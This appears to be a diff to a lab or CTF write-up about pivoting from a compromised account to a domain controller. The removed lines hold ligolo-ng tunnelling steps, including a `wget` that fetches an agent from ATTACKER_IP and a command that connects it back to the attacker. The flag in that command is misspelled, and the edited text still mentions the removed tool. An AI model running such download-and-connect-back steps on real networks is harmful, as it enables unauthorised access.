@@ -73,43 +73,7 @@ I listed the directories again, and `/backup` showed up once more. This time it 
 
 ![](images/hardcode_creds.png)
 
-I looked for ways to pivot to the domain controller. Pinging its IP address showed it was only reachable from inside the internal network, as `svc-drop`, so I needed to pivot through that account. I used the `ligolo-ng` tool for pivoting instead of SSH tunneling plus proxychains, since proxychains doesn't play well with `nmap` scans. I installed [ligolo-ng](https://github.com/nicocha30/ligolo-ng) (both the agent and proxy binaries).
-
-With the agent and proxy installed, on the attacker machine:
-
-```bash
-sudo ./proxy -selfcert
-```
-
-I ran an HTTP server:
-
-```bash
-python3 -m http.server 8888
-```
-
-On `svc-drop`:
-
-```bash
-wget http://ATTACKER_IP:8888/agent
-chmod +x agent
-./agent -connect ATTACKER_IP:11601 --ingore-cert
-```
-
-Then on the attacker machine:
-
-```text
-session (pick 1)
-ifcreate --name ligolo
-route_add --name ligolo --route 240.0.0.1/32
-
-route_add --name ligolo --route 192.168.11.51/32
-
-route_add --name ligolo --route 192.168.11.100/32
-
-tunnel_start --tun ligolo
-```
-
-And the tunnel was active.
+I looked for ways to pivot to the domain controller. Pinging its IP address showed it was only reachable from inside the internal network, as `svc-drop`, so I needed to pivot through that account. 
 
 I ran an `nmap` scan on the domain controller. Remember to use `-Pn`, since `ligolo-ng` doesn't support `nmap`'s host-discovery probes:
 
